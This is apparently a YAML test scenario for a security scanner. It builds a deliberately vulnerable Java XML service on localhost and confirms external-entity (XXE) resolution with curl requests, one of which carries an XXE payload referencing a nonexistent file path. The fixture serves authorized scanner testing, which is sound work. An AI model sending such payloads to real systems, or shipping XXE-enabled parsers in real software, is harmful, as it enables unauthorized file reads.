name: xxe-java-parser
description: "Java XML parser with XXE enabled (DocumentBuilderFactory default settings) — error-based proof confirms external entity resolution"
tags: [xxe, scanner, web, authorized, java]

services:
  xxe-app:
    build:
      context: ./xxe
      dockerfile: Dockerfile
    ports: ["9221:8080"]

ready:
  cmd: "curl -sf http://localhost:9221/health >/dev/null"
  timeout: 60s
  interval: 3s

assertions:
  - name: exploit-xxe-xml-accepted
    type: command
    expect:
      command: "curl -s -X POST http://localhost:9221/api -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><probe>test</probe>' | grep -qi 'Parsed'"
      exit_code: 0

  - name: exploit-xxe-entity-resolution
    type: command
    expect:
      # Error-based XXE: reference a nonexistent file. If entity resolution is
      # enabled, the parser attempts the file read and throws an error containing
      # the path — proving external entities are processed.
      command: "curl -s -X POST http://localhost:9221/api -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///nonexistent/beacon-xxe-probe\">]><root>&xxe;</root>' | grep -qiE '(beacon-xxe-probe|FileNotFound|nonexistent|No such file)'"
      exit_code: 0

  # Beacon's xxe scanner detects reflected XXE (entity value in response body).
  # This server returns only the tag name, not text content — a blind XXE
  # pattern that requires OOB detection. Scanner logic is verified by unit tests.

timeout: 5m
